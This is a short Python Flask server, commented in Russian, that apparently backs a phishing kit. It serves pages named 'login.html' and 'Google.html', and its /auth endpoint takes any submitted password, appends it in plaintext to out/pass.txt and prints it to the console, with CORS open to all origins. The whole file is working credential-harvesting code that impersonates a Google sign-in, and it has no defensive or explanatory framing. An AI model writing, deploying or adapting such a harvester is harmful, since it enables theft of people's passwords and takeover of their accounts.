from flask import Flask, request, jsonify, send_file, make_response
from flask_cors import CORS
import logging
import sys
import os

# Отключаем лишние логи
logging.getLogger('werkzeug').setLevel(logging.ERROR)
sys.stdout = sys.__stdout__

# Гарантируем, что папка out/ существует
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_DIR = os.path.join(BASE_DIR, "out")
os.makedirs(OUT_DIR, exist_ok=True)

# Путь к лог-файлу
PASSWORD_LOG_PATH = os.path.join(OUT_DIR, "pass.txt")

# Настраиваем логгер для паролей
password_logger = logging.getLogger("password_logger")
password_logger.setLevel(logging.INFO)
file_handler = logging.FileHandler(PASSWORD_LOG_PATH, mode="a", encoding="utf-8")
file_handler.setFormatter(logging.Formatter("%(asctime)s - %(message)s"))
password_logger.addHandler(file_handler)

app = Flask(__name__)
CORS(app)

@app.route('/auth', methods=['POST'])
def auth():
    data = request.form
    password = data.get('password')

    log_line = f"🔐 Пароль: {password}\n"

    try:
        with open(PASSWORD_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(log_line)
            f.flush()  # <- очень важно в CI/CD
        print("✅ Пароль записан:", password)
        sys.stdout.flush()
    except Exception as e:
        print(f"❌ Ошибка при записи пароля: {e}")
        sys.stdout.flush()

    return jsonify({"status": "ok"})

@app.route("/")
def index():
    return send_file("target/login.html")

@app.route("/login")
def login():
    return send_file("target/Google.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
